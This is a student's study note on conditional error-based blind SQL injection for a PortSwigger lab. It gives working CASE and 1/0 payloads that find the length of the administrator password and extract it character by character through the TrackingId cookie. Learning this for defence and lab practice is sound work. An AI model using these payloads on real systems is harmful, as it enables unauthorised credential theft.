🔐 SQL Injection — Conditional Error-Based

📚 Topic

Blind SQL Injection — Conditional Error Technique

🎯 Objective

Learn how attackers extract data when:

- Application does not show query results
- Page response does not change
- But database errors are visible

Instead of relying on page differences or delays, attackers trigger database errors intentionally.

---

🧠 Concept

Conditional Error SQL Injection works by forcing the database to generate an error when a condition is TRUE.

TRUE condition  → database error
FALSE condition → normal response

Attackers use this behavior to extract sensitive data.

---

⚙ Core SQL Logic

The key structure used is the CASE statement.

CASE 
WHEN condition 
THEN action
ELSE action
END

Example:

CASE 
WHEN 1=1 
THEN 'true'
ELSE 'false'
END

---

💥 Triggering Database Error

To generate an error intentionally attackers use:

1/0

Division by zero is mathematically impossible.

Database response:

ERROR: division by zero

This error becomes the signal for TRUE condition.

---

🧪 Basic Test Payloads

FALSE Condition

xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a

Explanation:

1=2 → FALSE
return 'a'
'a'='a'

Result:

Normal response (no error)

---

TRUE Condition

xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

Explanation:

1=1 → TRUE
execute 1/0

Result:

Database error

---

🔎 Attacker Observation

Condition| Result
FALSE| Normal page
TRUE| Server error

This difference allows attackers to extract information.

---

🔧 Important SQL Functions

CASE

Used to perform conditional logic.

CASE WHEN condition THEN result ELSE result END

---

SUBSTRING()

Extracts a specific character from a string.

Example:

SUBSTRING(password,1,1)

Meaning:

first character of password

---

LENGTH()

Used to determine string length.

Example:

LENGTH(password)

---

🔓 Example Data Extraction

Before extracting the password characters, attackers first determine the length of the password.

This is done by triggering a database error when the condition is TRUE.

Payload Structure

xyz' AND (
SELECT CASE
WHEN (username='administrator' AND LENGTH(password)=8)
THEN 1/0
ELSE 'a'
END
FROM users
)='a






Attacker wants to check the first character of the administrator password.

xyz' AND (
SELECT CASE
WHEN (SUBSTRING(password,1,1)='a')
THEN 1/0
ELSE 'a'
END
FROM users
WHERE username='administrator'
)='a

Logic:

If first character = a
→ division by zero error
→ attacker knows character is correct

---

🧩 Extraction Workflow

Typical attack steps:

1 Detect SQL injection

2 Confirm error-based behavior

3 Find password length

4 Extract characters one by one

---

🧠 Technique Comparison

Technique| Indicator
Boolean-Based| Page response difference
Conditional Error| Database error
Time-Based| Response delay

---

🧪 Real Practice

Practice this technique on:

- PortSwigger Web Security Academy
- bWAPP
- OWASP Juice Shop

---

🎯 Lab Goal (PortSwigger)

The objective of the lab is:

Extract the password of the user "administrator"
using a conditional error-based SQL injection
in the TrackingId cookie.

Steps generally involve:

1 Inject payload in TrackingId cookie
2 Trigger database error condition
3 Determine password length
4 Extract password characters

---

🧑‍💻 Author

Cybersecurity student focusing on:

- Web Application Security
- Penetration Testing
- Offensive Security
